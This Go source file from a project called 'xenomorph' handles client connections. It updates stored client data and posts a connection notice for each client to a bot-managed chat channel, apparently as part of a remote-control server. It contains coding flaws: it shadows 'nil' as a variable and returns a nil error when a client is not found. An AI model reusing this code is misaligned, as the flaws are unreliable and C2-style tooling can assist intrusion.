package messages

import (
	"encoding/json"
	"net"

	"github.com/codevault-llc/xenomorph/internal/common"
	"github.com/codevault-llc/xenomorph/pkg/embeds"
	"github.com/codevault-llc/xenomorph/pkg/logger"
	"go.uber.org/zap"
)

func (m *MessageCore) HandleConnection(_ string, msg *common.Message, conn *net.Conn) (*common.ClientData, error) {
	dataBytes, err := json.Marshal(msg.JsonData)
	if err != nil {
		logger.Log.Error("Failed to marshal data to JSON", zap.Error(err))
		return nil, err
	}

	var updatedClientData common.ClientData
	if err := json.Unmarshal(dataBytes, &updatedClientData); err != nil {
		logger.Log.Error("Failed to unmarshal data to ClientData", zap.Error(err))
	}

	clientData := m.Server.GetClientByAddress((*conn).RemoteAddr())
	if clientData == nil {
		logger.Log.Error("Client not found")
		return nil, err
	}

	logger.Log.Info("Client connected", zap.String("address", clientData.Addr.String()))

	updatedClientData.Addr = clientData.Addr
	updatedClientData.Socket = clientData.Socket

	data, nil := m.Server.UpdateClient(&updatedClientData)
	err = m.Bot.GenerateUser(data)
	if err != nil {
		logger.Log.Error("Failed to generate user", zap.Error(err))
	}

	embed := embeds.ConnectionEmbed(data)
	err = m.Bot.SendEmbedToChannel(m.Bot.GetChannelFromUser(data.UUID, "info"), "", &embed)
	if err != nil {
		logger.Log.Error("Failed to send message to channel", zap.Error(err))
	}

	return &updatedClientData, nil
}
